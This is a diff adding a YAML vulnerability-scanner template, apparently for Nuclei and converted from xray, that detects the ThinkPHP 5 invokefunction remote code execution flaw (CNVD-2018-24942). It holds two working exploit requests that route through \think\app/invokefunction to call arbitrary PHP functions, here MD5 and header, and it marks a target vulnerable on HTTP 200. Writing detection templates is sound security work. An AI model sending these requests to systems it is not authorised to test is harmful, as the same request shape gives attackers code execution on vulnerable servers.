@@ -1,0 +1,31 @@
+id: poc-yaml-thinkphp5-controller-invokefunction-rce-cnvd-2018-24942
+
+info:
+  name: poc-yaml-thinkphp5-controller-invokefunction-rce-cnvd-2018-24942
+  author: cr7 (https://github.com/ascar-ascar)
+  severity: critical
+  tags: xray-converted,rce,cnvd-2018-24942
+  reference:
+    - https://blog.riskivy.com/thinkphp5-x%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90
+
+http:
+  - raw:
+      - |
+        GET /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=MD5&vars[1][]={{rand_int(1000, 9999)}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=header&vars[1][]=TPRCEHEADER:{{rand_int(1000, 9999)}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
